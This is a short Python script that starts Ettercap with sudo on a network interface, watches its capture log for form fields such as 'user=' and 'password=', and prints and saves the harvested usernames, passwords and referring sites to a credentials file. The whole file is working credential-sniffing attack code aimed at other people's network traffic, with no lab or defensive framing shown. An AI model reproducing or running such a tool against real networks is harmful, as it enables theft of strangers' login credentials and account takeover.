# -*- coding: utf-8 -*-
"""
Created on Thu Apr 17 19:09:06 2025

@author: Jakob
"""

import time
import os
import re
import subprocess
import signal

log_file_path = "/tmp/ettercap_output.txt"
credentials_log = "credentials.log"
keywords = ["uname=", "user=", "username=", "pass=", "password="]
buffer = []

def start_ettercap():
    print("[*] Starting Ettercap...")
    interface = "eth0"  # ⚠️ Change this if your interface is different (e.g., wlan0)

    cmd = [
        "sudo", "ettercap", "-T", "-q",
        "-i", interface,
        "-w", log_file_path
    ]

    return subprocess.Popen(cmd)

def extract_creds(line):
    uname = re.search(r"(uname|user(name)?)=([^&\s]+)", line, re.IGNORECASE)
    passwd = re.search(r"(pass(word)?)=([^&\s]+)", line, re.IGNORECASE)
    return uname.group(3) if uname else None, passwd.group(3) if passwd else None

def watch_log():
    print("[*] Watching Ettercap log for credentials...\n")
    last_size = os.path.getsize(log_file_path) if os.path.exists(log_file_path) else 0

    while True:
        try:
            if os.path.exists(log_file_path):
                with open(log_file_path, "rb") as f:
                    f.seek(last_size)
                    new_bytes = f.read()
                    last_size = f.tell()

                    decoded_text = new_bytes.decode("utf-8", errors="ignore")

                    for line in decoded_text.splitlines():
                        if any(k in line.lower() for k in keywords):
                            buffer.append(line.strip())

                        if any("pass=" in l or "password=" in l for l in buffer) and any("uname=" in l or "user=" in l or "username=" in l for l in buffer):
                            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                            referer = next((l for l in buffer if "referer:" in l.lower()), "Unknown")
                            creds_line = next((l for l in buffer if "pass=" in l or "password=" in l), "")
                            uname_line = next((l for l in buffer if "uname=" in l or "user=" in l or "username=" in l), "")

                            username, password = extract_creds(uname_line + "&" + creds_line)

                            print(f"\n[+] Credential Detected ({timestamp})")
                            print(f"    Site: {referer.split(':', 1)[-1].strip()}")
                            print(f"    Username: {username}")
                            print(f"    Password: {password}")

                            with open(credentials_log, "a") as out:
                                out.write(f"[{timestamp}] {username}:{password} @ {referer}\n")

                            buffer.clear()

            time.sleep(1)

        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(2)

if __name__ == "__main__":
    ettercap_process = None
    try:
        ettercap_process = start_ettercap()
        time.sleep(2)  # Allow Ettercap time to start and begin writing
        watch_log()
    except KeyboardInterrupt:
        print("\n[!] Stopping everything...")
        if ettercap_process:
            ettercap_process.send_signal(signal.SIGINT)
            ettercap_process.wait()
        print("[*] Ettercap stopped. Goodbye.")
